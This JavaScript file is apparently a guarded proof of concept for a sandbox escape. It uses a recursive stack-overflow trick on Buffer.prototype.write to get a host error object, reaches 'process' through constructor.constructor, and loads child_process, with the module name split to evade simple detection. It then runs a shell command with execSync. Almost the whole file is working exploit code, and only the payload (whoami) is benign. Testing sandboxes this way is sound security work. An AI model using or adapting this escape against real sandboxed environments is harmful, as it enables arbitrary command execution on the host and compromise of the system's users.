if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

process.on("uncaughtException", (error) => {
	console.error(error);
	if (
		error.message === "Cannot read properties of undefined (reading 'require')"
	) {
		process.exit(82);
	}

	process.exit(1);
});

const f = Buffer.prototype.write;
const ft = {
	length: 10,
	utf8Write() {},
};
function r(i) {
	var x = 0;
	try {
		x = r(i);
	} catch (e) {}
	if (typeof x !== "number") return x;
	if (x !== i) return x + 1;
	try {
		f.call(ft);
	} catch (e) {
		return e;
	}
	return null;
}
var i = 1;
while (1) {
	try {
		i = r(i).constructor.constructor("return process")();
		break;
	} catch (x) {
		i++;
	}
}
const out = i.mainModule
	.require("child" + "_process")
	.execSync("whoami")
	.toString();
console.log(out);
